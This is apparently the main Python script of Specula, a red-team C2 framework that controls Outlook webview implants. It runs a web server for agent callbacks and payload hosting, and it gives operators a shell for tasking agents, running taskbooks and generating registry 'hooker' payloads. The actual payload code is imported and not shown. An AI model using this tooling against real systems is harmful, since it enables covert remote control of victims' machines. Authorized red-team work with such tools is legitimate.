import argparse
#from distutils.log import error
import sys
import os
import inspect


# PLATFORM CHECKS
if sys.version_info <= (3, 0):
    sys.stdout.write("Sorry, requires Python 3.x, not Python 2.x\n")
    sys.exit(1)

if os.name == 'nt':
    print("WINDOWS as Host OS Not currently supported - exiting")
    sys.exit()
    #TODO uncomment below

#Check if you are running from the specula main directory
if os.path.dirname(os.path.abspath(__file__)) != os.getcwd():
    print("[!] Not executed in Specula Primary Directory. Change directory to main Specula directory and rerun application.")
    sys.exit()

#Check Sudo
if os.geteuid() != 0:
         print("\n[!] Specula C2 needs to be run as root (web socket binding, etc.)... Re-run Specula C2 as sudo/root in order to run.")
         sys.exit()

import logging
import urllib3
import asyncio
import readline
import threading
import traceback
import cmd
import ssl
import time
import hooker_generator
#ensure tornado is installed
try:
    import tornado.web
    import tornado.ioloop
    import tornado.httpserver
except ImportError:
    print("[!] Python module tornado not installed. Try pip install -r requirements.txt and re-run Specula C2.")
    sys.exit()

from datetime import datetime, date

from lib.handlers.specapplication import speculaApplication
from lib.handlers.speccomms import AgentComHandler
from lib.handlers.specdevcomms import AgentDevComHandler
from lib.handlers.specpayload import PayloadHandler
from lib.handlers.specvalidate import ValidateAgentHandler, UnknownPageHandler
from lib.menu.specpromptprestage import SpecPromptPrestage
from lib.menu.specpromptinteract import SpecPromptInteract
from lib.menu.specpromptdbedit import SpecPromptDbedit
from lib.menu.specpromptpayload import SpecPromptPayload
from lib.menu.specpromptpushover import SpecPromptPushover
from lib.core.helpers import Helpers
from lib.core.setup import Config
from lib.core.setup import gconfig

#Auto complete settings for TAB - Needed for CMD import as well
readline.set_completer_delims(' \t\n=')
readline.parse_and_bind("tab: complete")



__authors__ = 'Oddvar Moe (@oddvarmoe), Christopher Paschen (@freefirex2)'

__version__ = '1.0.0'


#Disable warning looging to console
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.getLogger("tornado.general").setLevel(logging.INFO)
logging.getLogger('urllib3').setLevel(logging.INFO)
logging.basicConfig(level=logging.INFO, 
                    format='[%(asctime)s] %(message)s', 
                    datefmt='%Y-%m-%d %H:%M:%S',
                    filename='./weblog.log')
log = logging.getLogger(__name__)

### CLASSES ###

class SpecPrompt(cmd.Cmd): #Leaving this one here as it is the top level menu
    def __init__(self, helpers):
        self.helpers = helpers
        super().__init__()
        while (len(helpers.rccommands) > 0):
            self.onecmd(helpers.rccommands.pop(0))
    intro = "Specula C2 shell"
    prompt = 'SpeculaC2>'
    completekey = 'tab'

    def precmd(self, line): # Added for operator logging
        self.helpers.operatorlog(str(line), False)
        return(line)

    def emptyline(self):
        """Called when an empty line is entered in response to the prompt.

        If this method is not overridden, it repeats the last nonempty
        command entered.

        """
        if self.lastcmd:
            self.lastcmd = ""
            return self.onecmd('\n')

    def do_exit(self, inp):
        print("[*] Exiting SpeculaC2")
        return True
    
    def help_exit(self):
        print("Exits Specula")
    
    def do_updatecodebase(self, inp):
        del self.helpers.modlist
        self.helpers.modlist = {}
        self.helpers.loadModules("./functions")
        print("Updated module list")

    def help_updatecodebase(self):
        print("Description: Re-imports all vbscript code inside the functions folder. Updates the module menu and adds encrypted code to all agents")    
        print("Usage: updatecodebase")    

    def do_generatehooker(self, inp):
        args = Helpers.getarguments(inp)
        if len(args) == 0:
            hooker_payloads = hooker_generator.Payloads(gconfig.DNS_NAME+gconfig.VALIDATE_URL,None, None, True, None, False)
            print(hooker_payloads.gen_registry_hooker())
        else:
            hooker_payloads = hooker_generator.Payloads(gconfig.DNS_NAME+gconfig.VALIDATE_URL,None, None, True, None, False)
            if args[0] == "reg":
                print(hooker_payloads.gen_registry_hooker())

    def help_generatehooker(self):
        print("Description: Runs the hooker_generator script inside specula to generate the payloads on screen")    
        print("Usage - gen all: generatehooker")  
        print("Usage - gen specific: generatehooker reg")

    def do_agents(self, inp):
        if self.helpers.a_list == []:
            print("No available SpeculaC2 Agents.")
        else:
            print("%-4s%-30s%-18s%-13s%-22s%-12s%-25s%-8s" % (
            "id", "hostname:username", "ip address", "refreshTime", "Lastseen", "approved", "encryptionkey", "api installed/verified"))
            for agent in self.helpers.a_list:
                if agent.approved == False:
                    print("%-4s%-30s%-18s%-13s%-22s%-12s%-25s%-8s" % (
                        str(agent.id), agent.hostname + ":" + agent.username, agent.remoteip, str(agent.refreshtime), agent.lastcheckin, "NO (Checkin: " + str(agent.initialcheckincount+1) + " of " + str(gconfig.INITIAL_CHECKIN_COUNT) + ")", "N/A", str(agent.api_installed) + "/" + str(agent.api_verified)))
                else:
                    print("%-4s%-30s%-18s%-13s%-22s%-12s%-25s%-8s" % (
                        str(agent.id), agent.hostname + ":" + agent.username, agent.remoteip, str(agent.refreshtime), agent.lastcheckin, "YES", agent.encryptionkey, str(agent.api_installed) + "/" + str(agent.api_verified)))

    def help_agents(self):
        print("Description: Lists all available agents")    
        print("Usage: agents")    

    def do_interact(self, inp):
        try:
            agent = self.helpers.a_list.get_agent(int(inp))
            selected_agent = agent
            i = SpecPromptInteract(selected_agent, self.helpers)
            if i.ranAuto:
                return
            i.prompt = self.prompt[:-1]+':'+agent.hostname+'>'
            i.cmdloop()
        except ValueError:
            print("Agent not found - Did you specify a valid ID?")
            traceback.print_exc()
        except TypeError:
            print("Agent not found - Did you specify a valid ID?")
            traceback.print_exc()
        except AttributeError:
            print("Agent not found - Did you specify a valid ID?")
            traceback.print_exc()

    def help_interact(self):
        print("Description: Interact with specified agent")
        print("Usage: interact <id>")

    def complete_interact(self, text, line, begidx, endidx):
        agent_ids = self.helpers.a_list.get_agents_id()
        return [i for i in agent_ids if i.startswith(text)]

    def do_pushover(self, inp):
        try:
            i = SpecPromptPushover(self.helpers)
            if i.ranAuto:
                return
            i.prompt = self.prompt[:-1]+':pushover>'
            i.cmdloop()
        except (ValueError, TypeError, AttributeError) as e:
            print("Not sure what happened")
            traceback.print_exc()
    
    def do_payload(self, inp):
        try:
            i = SpecPromptPayload(self.helpers)
            if i.ranAuto:
                return
            i.prompt = self.prompt[:-1]+':payload>'
            i.cmdloop()
        except (ValueError, TypeError, AttributeError) as e:
            print("Not sure what happened")
            traceback.print_exc()
    
    def help_payload(self):
        print("Description: Allows you to add/remove/list payloads")
        print("Usage: payload")

    def do_dbedit(self, inp):
        try:
            agent = self.helpers.a_list.get_agent(int(inp))
            selected_agent = agent
            i = SpecPromptDbedit(selected_agent, self.helpers)
            if i.ranAuto:
                return
            i.prompt = self.prompt[:-1]+':'+agent.hostname+'>'
            i.cmdloop()
        except (ValueError, TypeError, AttributeError):
            print("Agent not found - Did you specify a valid ID?")
            traceback.print_exc()

    def help_dbedit(self):
        print("Description: Allows you to edit all db data for agent, intended for debugging or rare cases")
        print("Usage: dbedit <id>")

    def complete_dbedit(self, text, line, begidx, endidx):
        agent_ids = self.helpers.a_list.get_agents_id()
        return [i for i in agent_ids if i.startswith(text)]

    def do_prestage(self, inp):
        try:
            i = SpecPromptPrestage(self.helpers)
            if i.ranAuto:
                return
            i.prompt = self.prompt[:-1]+':prestage>'
            i.cmdloop()
        except (ValueError, TypeError, AttributeError) as e:
            print("Not sure what happened")
            traceback.print_exc()
    
    def help_prestage(self):
        print("Description: Enters prestage menu where you can prestage agents.")
        print("Usage: prestage")
    
    def do_settings(self, inp): # Read from config file later on...
        print("Time format: {}".format(gconfig.TIME_FORMAT))
        print("DNS Name: {}".format(gconfig.DNS_NAME))
        print("Pushover user token: {}".format(gconfig.PUSHOVER_API_TOKEN))
        print("Pushover app token: {}".format(gconfig.PUSHOVER_APP_API_TOKEN))
        print("Initial Checkin Count: {}".format(gconfig.INITIAL_CHECKIN_COUNT))
        print("Validation URL: {}".format(gconfig.VALIDATE_URL))
        print("Base Path Agent Communication: {}".format(gconfig.BASE_PATH_AGENT_COM))
        print("Base Payload URL: {}".format(gconfig.BASE_PAYLOAD_URL))
        print("Redirect False Agents: {}".format(gconfig.REDIRECT_FALSE_AGENTS))
        print("Default Refresh Time: {}".format(gconfig.DEFAULT_REFRESH_TIME))
        print("Global Jitter Time: {}".format(gconfig.JITTER))
        print("Specula Log File: {}".format(gconfig.SPECULA_LOG_FILE))
        print("Operator Log File: {}".format(gconfig.OPERATOR_LOG_FILE))
        print("Server Header: {}".format(gconfig.SERVER_HEADER))
        print("Encryptionkey Registry Location: {}".format(gconfig.ENCRYPTIONKEY_REGISTRY_LOCATION))
        print("Encryptionkey Value name: {}".format(gconfig.ENCRYPTIONKEY_VALUENAME))
        print("Outlook View ID: {}".format(gconfig.OUTLOOK_VIEW_ID))
        print("CLSID: {}".format(gconfig.CLSID))
        print("Database File Name: {}".format(gconfig.DATABASEFILENAME))
        print("SSL Enabled: {}".format(gconfig.SSL))
        print("Webserver Port: {}".format(gconfig.WEBSERVER_PORT))
        print("Certificate File: {}".format(gconfig.CERT_FILE))
        print("Certificate Key File: {}".format(gconfig.KEY_FILE))
        print("blocklist File: {}".format(gconfig.IP_blocklist))
        print("Server end date: {}".format(gconfig.END_DATE))
        print("Push subscription Validation: {}".format(gconfig.PUSH_VALIDATION))
        print("Push subscription New Agent: {}".format(gconfig.PUSH_NEWAGENT))
        print("Push subscription New IP: {}".format(gconfig.PUSH_NEWIP))
        print("Push subscription Unexpected Callbacks: {}".format(gconfig.PUSH_UNEXPECTEDCALLBACK))
        print("Push subscription Unknown Connections: {}".format(gconfig.PUSH_UNKNOWNCONNECTION))
        print("Push subscription Prestage Agents: {}".format(gconfig.PUSH_PRESTAGE))
        print("Push subscription Connection Outside Specula: {}".format(gconfig.PUSH_CONNECTION_OUTSIDESPECULA))

    def help_settings(self):
        print("Description: Shows global settings")
        print("Usage: settings")

    def do_listblocklist(self, cmd):
        self.helpers.listblocklist()

    def do_listallowlist(self, cmd):
        self.helpers.listallowlist()

    def do_addblocklist(self,cmd):
        args = self.helpers.getarguments(cmd)
        if len(args) > 1:
            print("improper usage")
            self.help_addblocklist()
            return
        self.helpers.addblocklist(args[0], False)

    def help_addblocklist(self):
        print("Description: add a single item to the specula blocklist file and active record store")
        print("Usage: addblocklist <ip>")

    def do_updateSetting(self, cmd):
        args = Helpers.getarguments(cmd)
        if len(args) == 0:
            print("You need to specify a key")
            return
        key = args.pop(0)
        if len(args) == 0:
            val = None
        else:
            val = ' '.join(args)
        try:
            if hasattr(gconfig, key):
                setattr(gconfig, key, val)
                if key == 'IP_blocklist':
                    self.helpers.init_blocklist()
            else:
                print("Invalid setting")
        except Exception as msg:
            print("Failed to set option: {}".format(msg))

    def do_approveAgent(self, cmd):
        args = self.helpers.getarguments(cmd)
        if len(args) == 0:
            print("you must provide an agent to approve")
            return
        agent = helpers.a_list.get_agent(args[0])
        if agent is None:
            print("Could not find the id given")
            return
        agent.initialcheckincount = gconfig.INITIAL_CHECKIN_COUNT-2
        self.helpers.save_agents_to_file()
        print("Agent will be approved on next callback")

    def complete_approveAgent(self, text, line, begidx, endidx):
        return [str(i.id) for i in self.helpers.a_list if str(i.id).startswith(text)]

    def help_approveAgent(self):
        print("manually sets an agent to approved")

    def do_blocklistAgent(self, cmd):
        args = self.helpers.getarguments(cmd)
        if len(args) == 0:
            print("you must provide an agent to approve")
            return
        agent = helpers.a_list.get_agent(args[0])
        if agent is None:
            print("Could not find the id given")
            return
        agent.approved = False
        self.do_addblocklist(agent.remoteip)
        self.helpers.save_agents_to_file()
        print("blocklisted!")

    def complete_blocklistAgent(self, text, line, begidx, endidx):
        return [str(i.id) for i in self.helpers.a_list if str(i.id).startswith(text)]

    def help_blocklistAgent(self):
        print("manually blocklist an agent")


    def help_updateSetting(self):
        print("Description: use this to change a setting")
        print("Usage: updateSetting <settingname>")
        print("Currently This is experiemental, options will update, but the effect inside the framework for updating as"
              "options are running is as of yet, untested")

    def complete_updateSetting(self, text, line, begidx, endidx):
        return [i for i, j in inspect.getmembers(gconfig) if i.startswith(text) and i[0] != '_']

    def do_clear(self, inp):
        os.system('clear')

    def do_listallq(self, cmd):
        for selected_agent in self.helpers.a_list:
            print("{:4} {:30} {:18}".format(selected_agent.id, selected_agent.hostname + ':' +selected_agent.username, selected_agent.remoteip))
            if len(selected_agent.tasks) == 0:
                print("\tEmpty queue")
            else:
                for item in selected_agent.tasks:
                    print("\tQueue Item #{}".format(selected_agent.tasks.index(item) + 1))
                    print("\t\tModule Name:\t{}".format(item.name))
                    for arg in item.options.keys():
                        if 'hidden' not in item.options[arg] or item.options[arg]['hidden'] is False:
                            print("\t\t{}:\t{}".format(arg, item.options[arg]['value']))
                    print("\n")

    def help_listallq(self):
        print("Description: List all agents task queues")

    
    def help_clear(self):
        print("Description: Clears the screen")
        print("Usage: clear")
    
    def do_logo(self, inp):
        gen_logo()
    
    def help_logo(self):
        print("Description: Show the incredible Specula logo")
        print("Usage: logo")

    def do_dbdata(self, inp):
        outlist = {}
        try:
            agent = self.helpers.a_list.get_agent(int(inp))
            for value in vars(agent):
                if value == "encryptedvbsfunctions":
                    outlist.update( {"functions loaded" : len(agent.encryptedvbsfunctions) })
                elif value == "tasks":
                    outlist.update( {"tasks in queue" : len(agent.tasks) })
                else:
                    outlist.update( {value : str(vars(agent)[value]) })
            for key,val in sorted(outlist.items()):
                print("{} : {}".format(key,val) , end = "\n")
        except ValueError:
            print("Agent not found - Did you specify a valid ID?")
        except TypeError:
            print("Agent not found - Did you specify a valid ID?")

    def help_dbdata(self):
        print("Description: Shows all db data for agent, intended for debugging")
        print("Usage: dbdata <id>")

    def complete_dbdata(self, text, line, begidx, endidx):
        agent_ids = self.helpers.a_list.get_agents_id()
        return [i for i in agent_ids if i.startswith(text)]
        
    def do_log(self, inp):
        try:
            print(open('./'+gconfig.SPECULA_LOG_FILE, "r").read())
        except FileNotFoundError:
            print("Log file not found - verify that ./{} exists".format(gconfig.SPECULA_LOG_FILE))

    def help_log(self):
        print("Description: Shows output from the main log specula log file")
        print("Usage: log")

    def do_resetdb(self, inp):
        while 1:
            confirm = input("Are you sure you want to delete all agents from database?\n\nA PREFERRED WAY WOULD BE TO RUN THE TASK: Exe - Remove Homepage on each agent.\nYou will not be able to recover this after you answer yes. \n\nYou have been WARNED!\n\nType YES to confirm (needs to be uppercase) - Anything else will exit without deleting\n")
            if confirm == "YES":
                del self.helpers.a_list[:]
                self.helpers.save_agents_to_file()
                print("Removed all data from " + gconfig.DATABASEFILENAME)
                break
            else:
                break

    def help_resetdb(self):
        print("Description: Removes all agents from the database - Get a fresh start")
        print("Usage: resetdb")
    
    def default(self, inp):
        if inp == 'exit' or inp == 'quit':
            return self.do_exit(inp)
 
        print("Default: {}".format(inp))

    def do_runTaskbook(self, cmd):
        args = self.helpers.getarguments(cmd)
        if len(args) != 2:
            print("Invalid command, check help if needed")
            return
        try:
            if args[1] not in self.helpers.taskbooks:
                print("could not find requested taskbook")
                return
            task = self.helpers.taskbooks[args[1]]
            agents = []
            if args[0] == '*': # run taskbook on all agents:
                agents = self.helpers.a_list
            else:
                agents = [self.helpers.a_list.get_agent(int(i)) for i in args[0].split(',')]
                print(agents)
            for agent in agents:
                self.helpers.speclog('{}: running taskbook {}'.format(agent.hostname, args[1]), output=True)
                task.TaskBook(self.helpers, agent)
        except Exception as msg:
            traceback.print_exc()
            print("error while attempting to run taskbook: {}".format(msg))

    def complete_runTaskbook(self, text, line, begidx, endidx):
        args = self.helpers.getarguments(line)
        if len(args) < 2 or (len(args) == 2 and line[-1] != ' '):
            if len(text) == 0:
                return self.helpers.a_list.get_agents_id() + ['*']
            elif text[-1] == ',' and '*' not in line: #have to sanity check the system
                return [text + i for i in self.helpers.a_list.get_agents_id() if i not in text.split(',')]
            elif '*' not in line:
                return [text + ',' + i for i in self.helpers.a_list.get_agents_id() if i not in text.split(',')]
        else:
            return [i for i in self.helpers.taskbooks.keys() if i.startswith(text)]

    def help_runTaskbook(self):
        print("Usage: runTaskbook <* OR comma separated ids> <taskbookname>")

    def do_version(self, version):
        print("Running version: {0}".format(__version__))
    
    def help_version(self):
        print("Usage: version")

def sig_handler(server, sig, frame):
    io_loop = tornado.ioloop.IOLoop.instance()

    def stop_loop(deadline):
        now = time.time()
        if now < deadline and (io_loop._callbacks or io_loop._timeouts):
            logging.info('Waiting for next tick')
            io_loop.add_timeout(now + 1, stop_loop, deadline)
        else:
            io_loop.stop()
            logging.info('Shutdown finally')

    def shutdown():
        logging.info('Stopping http server')
        server.stop()
        logging.info('Will shutdown in %s seconds ...',
                     5)
        stop_loop(time.time() + 5)

    logging.warning('Caught signal: %s', sig)
    io_loop.add_callback_from_signal(shutdown)

def main_c2(helpers):
    global running
    application = speculaApplication(helpers, [
        (gconfig.VALIDATE_URL, ValidateAgentHandler),
        (gconfig.BASE_PATH_AGENT_COM+".*", AgentComHandler),
        #("/devcom/.*", AgentDevComHandler), # ONLY ENABLE ON DEV
        (gconfig.BASE_PAYLOAD_URL+"(.*)", PayloadHandler, {"path": "./payloadhosting/"}),
        (r'/.*', UnknownPageHandler)  # Make this the last line, if not matched, will hit this rule.
    ], autoescape=None) #, debug=True) #Remove debug if you dont want every url request
    ssl_opts = None if not gconfig.SSL else {'certfile': gconfig.CERT_FILE, 'keyfile': gconfig.KEY_FILE, 'ssl_version': ssl.PROTOCOL_TLSv1_2}
    try:
        asyncio.set_event_loop(asyncio.new_event_loop())
        http_server = tornado.httpserver.HTTPServer(application, ssl_options=ssl_opts)
        http_server.xheaders = True  #Makes sure to get the real_ip if x-options are in use: https://www.tornadoweb.org/en/stable/httpserver.html
        http_server.listen(gconfig.WEBSERVER_PORT) #Read from global config
        tornado.ioloop.IOLoop.instance().start()
        http_server.start()
    except Exception as e:
        if "Address already in use" in str(e):
            print("[!] Something is already listening on the port. Stop the service and try again (hint service apache2 stop).")
            helpers.closelog()
            os._exit(1) # need os._exit() vs sys.exit due to inside of thread
        else:
            print("[!] Something went wrong, printing error message here: " + str(e))

#def monitor():  ### Add monitor code here - pushover, tasks that goes wrong etc
#    while True:
#        time.sleep(10)
        #print("Inside monitor")
    

def gen_logo():
    print("\033[0;37m                                                                  ")
    print("                                  @@                               ")
    print("                                @@@@@@                              ")
    print("                              @@@@@@@@@@                            ")
    print("                            @@@@@@@@@@@@@@                          ")
    print("                           @@@@@@@@@@@@@@@                          ")
    print("                           @@@@@@@@@@@@@@@                          ")
    print("                           @@@@@@@@@@@@@@@                          ")
    print("                   @       @@@@@@   @@@@@@       @@                 ")
    print("                @@@@       @@@@       @@@@       @@@@               ")
    print("              @@@@@@    @@@@@    @@     @@@@@    @@@@@@@            ")
    print("              @@@@@@  @@@@      @@@@       @@@@  @@@@@@@            ")
    print("              @@@@@@@@@@     @@@    @@@     @@@@@@@@@@@             ")
    print("      @       @@@@@@@      @@@        @@@       @@@@@@@@     @@     ")
    print("    @@@       @@@@@      @@              @@       @@@@@@     @@@@   ")
    print("  @@@@@      @@@@     @@@        @@@       @@@      @@@@     @@@@@@ ")
    print("  @@@@@   @@@@      @@@        @@@@@@@       @@@       @@@   @@@@@@ ")
    print("  @@@@@@@@@@     @@@        @@@@@@@@@@@@@       @@@      @@@@@@@@@@ ")
    print("  @@@@@@@@     @@@        @@@@@@     @@@@@@       @@@      @@@@@@@@ ")
    print("  @@@@@     @@@        @@@@@@@          @@@@@@       @@@      @@@@@ ")
    print("  @@@     @@@        @@@@@@@      @       @@@@@@       @@@      @@@ ")
    print("  @    @@@         @@@@@@      @@@@@@       @@@@@         @@@    @ ")
    print("     @@@       @@    @@@@@@ @@@@@@@@@@@       @@@@@@        @@@     ")
    print("   @@@        @@@@@@    @@@@@@@@@   @@@@@@@      @@@@@        @@@   ")
    print("  @@            @@@@@@     @@@@@@ \033[0;31m-:\033[0;37m   @@@@@@@ @@@@@            @@  ")
    print("        @@        @@@@@@     @@@@  \033[0;31m#+\033[0;37m    @@@@@@@@@         @@       ")
    print("     @@@@@           @@@@@      \033[0;31m*:+#*- :\033[0;37m    @@@@           @@@@     ")
    print("   @@@@@@@             @@@@@@   \033[0;31m=*##+:+*\033[0;37m                   @@@@@@@  ")
    print("  @@@@@@@@               @@@@  \033[0;31m*###*::+#+\033[0;37m                  @@@@@@@@ ")
    print("  @@@@@@@@                 @\033[0;31m-:##**#######\033[0;37m  @               @@@@@@@@ ")
    print("  @@@@@@@@                   \033[0;31m=#*-=#######\033[0;37m  @@@@            @@@@@@@@ ")
    print("  @@@@@@@@            @@@    \033[0;31m:#*:    =##+\033[0;37m  @@@@@@          @@@@@@@@ ")
    print("  @@@@@@@@          @@@@@@@@  \033[0;31m:+=    -+:::\033[0;37m   @@@@@@@       @@@@@@@@ ")
    print("  @@@@@@@@        @@@@@@@@@@@@          @@     @@@@@@@     @@@@@@@@ ")
    print("  @@@@@@@@     @@@@@@      @@@@@     @@@@@@@      @@@@     @@@@@@@@ ")
    print("  @@@@@@@@       @@@@@@      @@@@@@@@@@@@@@@@@@            @@@@@@@@ ")
    print("  @@@@@@@@         @@@@@@      @@@@@@@     @@@@@@          @@@@@@@@ ")
    print("  @@@@@              @@@@@@@     @@@     @@@@@@@               @@@@ ")
    print("  @@    @@@@@           @@@@@@         @@@@@@           @@@@@@   @@ ")
    print("      @@@@@@@@@           @@@@@@     @@@@@@           @@@@@@@@@@    ")
    print("  @@@@@@@@@@@@@@@@           @@@@@@@@@@@            @@@@@@@@@@@@@@@ ")
    print("  @@@@@@@@@@@@@@@@@@           @@@@@@@           @@@@@@@@@@@@@@@@@@ ")
    print("  @@@@@@@@@@@@@@@@@@@@           @@@           @@@@@@@@@@@@@@@@@@@@ ")
    print("  @@@@@@@@@@@@@@@@@@@@@@@                   @@@@@@@@@@@@@@@@@@@@@@@ ")
    print("  @@@@@@@@  @@@@@@@@@@@@@@@@             @@@@@@@@@@@@@@@@  @@@@@@@@ ")
    print("  @@@@@@@@    @@@@@@@@@@@@@@@@         @@@@@@@@@@@@@@@     @@@@@@@@ ")
    print("  @@@@@@@@       @@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@        @@@@@@@@ ")
    print("  @@@@@@@@          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@          @@@@@@@@ ")
    print("  @@@@@@@@            @@@@@@@@@@@@@@@@@@@@@@@@@            @@@@@@@@ ")
    print("  @@@@@@@@              @@@@@@@@@@@@@@@@@@@@@              @@@@@@@@ ")
    print("  @@@@@@@@                @@@@@@@@@@@@@@@@@                @@@@@@@@ ")
    print("  @@@@@@@@                  @@@@@@@@@@@@@                  @@@@@@@@ ")
    print("  @@@@@@@@                    @@@@@@@@@                    @@@@@@@@ ")
    print("  @@@@@@@@                       @@@                       @@@@@@@@ ")
    print("  @@@@@@@@                                                 @@@@@@@@ ")
    print("  @@@@@@@@                                                 @@@@@@@@ ")
    print("  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ")
    print("  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ")
    print("  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ")
    print("  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ")
    ##Orange = \033[33m
    ##Yellow = \033[1;33m
    ##Red = \033[0;31m
    #print("\033[0;31m                                                                 /")
    #print("\033[0;31m                                                               ///")
    #print("\033[0;31m                                                              ////")
    #print("\033[33m                                                            *\033[0;31m///////")
    #print("\033[33m                                                          ****\033[0;31m////////")
    #print("\033[33m                                                       *********\033[0;31m//////")
    #print("\033[33m                                                     ***********\033[0;31m//////")
    #print("\033[33m                                                     ***********\033[0;31m//////        /")
    #print("\033[33m                                                     ***********\033[0;31m//////     ,////,")
    #print("\033[33m                                            *        ***********\033[0;31m//////////////////")
    #print("\033[33m                                            **       **********\033[0;31m////////////////////")
    #print("\033[33m                                          ******   *************\033[0;31m//////////////////////")
    #print("\033[33m                                          *********************\033[0;31m///////////////////////")
    #print("\033[33m                                        **********************\033[0;31m/////////////////////////")
    #print("\033[0;35m       /////////////////////////////////\033[33m*********************\033[0;31m///////////////////////\033[0;35m...//////////////////////////////")
    #print("\033[0;35m       /////////////////////////////////\033[33m*********************\033[0;31m///////////////////////\033[0;35m...//////////////////////////////")
    #print("\033[0;35m       //////                           \033[33m********************\033[0;31m////////////////////////           \033[0;35m                //////")
    #print("\033[0;35m       //////       .,&&(((((&&,        \033[33m*********************\033[0;31m///////////////////////        \033[0;35m,&&(((((&&,.       //////")
    #print("\033[0;35m       //////       @@////////&@@*        \033[33m********************\033[0;31m////////////////////        \033[0;35m*@@&////////@@       //////")
    #print("\033[0;35m       //////       @@//////////(@,*       \033[33m.*******************\033[0;31m/////////////////        \033[0;35m*,@(//////////@@       //////")
    #print("\033[0;35m       //////       **@@///////////&@@*,      \033[33m*******************\033[0;31m/////////////      \033[0;35m,*@@&///////////@@**       //////")
    #print("\033[0;35m       //////         **@@*//////////(@@*   .   \033[33m..*****************\033[0;31m////////.   .   \033[0;35m*@@(//////////*@@**         //////")
    #print("\033[0;35m       //////           , &@@///////////&@(          \033[33m,,,**************\033[0;31m,          \033[0;35m(@&///////////@@& ,           //////")
    #print("\033[0;35m       //////              **@@///////////(@@*,                              ,*@@(///////////@@**              //////")
    #print("\033[0;35m       //////                ,,&&((//////////&@(/                          /(@&//////////((&&,,                //////")
    #print("\033[0;35m       //////                    (@@*//////////(@&,,                    ,,&@(//////////*@@(                    //////")
    #print("\033[0;35m       //////                     .,&&((//////////&@((                ((@&//////////((&&,.                     //////")
    #print("\033[0;35m       //////                         ((&&//////////(@&&,          ,&&@(//////////&&((                         //////")
    #print("\033[0;35m       //////                       **@@///////////////&@@*      *@@&///////////////@@**                       //////")
    #print("\033[0;35m       //////                     &&@@///////////////////(@&&..&&@(///////////////////@@&&                     //////")
    #print("\033[0;35m       //////                  **@@&//////////(@@///////////&@@&///////////@@(//////////&@@**                  //////")
    #print("\033[0;35m       //////                **@@///////////&@@**@@*////////////////////*@@**@@&///////////@@**                //////")
    #print("\033[0;35m       //////             .((&&//////////(@&&.   .%&@@////////////////@@&%.   .&&@(//////////&&((.             //////")
    #print("\033[0;35m       //////           *&@@(//////////&@@*         **@@////////////@@**         *@@&//////////(@@&*           //////")
    #print("\033[0;35m       //////       ..((&&//////////(@&%,             ,,%%((////((%%,,             ,%&@(//////////&&((..       //////")
    #print("\033[0;35m       //////       &@((//////////@@//                    /@@@@@@/                    //@@//////////((@&       //////")
    #print("\033[0;35m       //////       @@/////////#@%,,                                                    ,,%@#/////////@@       //////")
    #print("\033[0;35m       //////       @@///////@@/*                                                          */@@/////@@//       //////")
    #print("\033[0;35m       //////       ,*@@@@@@@*,                                                              ,*@@@@@**         //////")
    #print("\033[0;35m       //////                                                                                                  //////")
    #print("\033[0;35m       //////////////////////////////////////////////////////////////////////////////////////////////////////////////")
    #print("\033[0;35m       //////////////////////////////////////////////////////////////////////////////////////////////////////////////")
    print("\033[0m")
    print("Specula - Outlook webview C2 - Code based on TrevorC2 by \033[1;101mDave Kennedy\033[1;49m")
    print("\033[1;36;40mSpecula in Latin means watchtower/lookout\033[0m")
    print("\nWritten originally by: \033[1;34;40mOddvar Moe\033[0m (@oddvarmoe)")
    print("Re-written by: \033[1;34;40mChristopher Paschen\033[0m (@freefirex2)")
    print("Contributions from the entire \033[32mTrustedSec Targeted Operations Team \033[0;31m<3\033[0m - AKA UNC1194   \n")
    
    #PYTHONVER = sys.version_info[0]


if __name__ == "__main__":
    if not os.path.exists('agent_data'):
        os.makedirs('agent_data')
    if not os.path.exists('payloadhosting'):
        os.makedirs('payloadhosting')
    gen_logo()
    #initial or load setup
    helpers = Helpers(log)
    helpers.loadModules("./functions")
    helpers.loadModules("./hiddenFunctions", hidden=True)
    helpers.loadTaskBooks("./Taskbooks")
    helpers.load_agents_from_file(gconfig.DATABASEFILENAME)
    helpers.load_payloads_from_file(gconfig.PAYLOADFILENAME)
    parser = argparse.ArgumentParser(
        description="outlook implant framework")
    parser.add_argument('-r', type=argparse.FileType('r'), default=None,
                        help="rcfile with list of commands to execute in order (can not use taskbook in this interface)")
    parser.add_argument('-d', action='store_true', help='debug what is going on, not opsec safe')
    args = parser.parse_args()
    if args.d:
        gconfig.DEBUG = True
    if args.r is not None:
        precommands = args.r.readlines()
        helpers.rccommands = [c.strip('\n') for c in precommands]
    t = threading.Thread(target=main_c2, args=(helpers,))
    t.start()
    #w = threading.Thread(target=monitor)
    #w.start()
    print("[*] Specula Version " + str(__version__))
    print("[*] Type help for usage\n")
    
    keep_running = True
    while keep_running:
        try:
            ### INIT Main Command line ###
            commandline = SpecPrompt(helpers)
            commandline.cmdloop()
            helpers.closelog()
            os._exit(0) #Exit out

        except KeyboardInterrupt:
                print("\n\n[*] Exiting SpeculaC2")
                helpers.operatorlog(str("Keyboard interupt (ctrl+c)"), False)
                response = input("Are you sure you want to quit(y to quit)? ").lower()
                if response == "y":
                    helpers.operatorlog(str("y"), False)
                    helpers.closelog()
                    os._exit(0)
                else:
                    keep_running = True

            #os.system('kill $PPID') # This is an ugly method to kill process, due to threading this is a quick hack to kill with control-c. Will fix later.

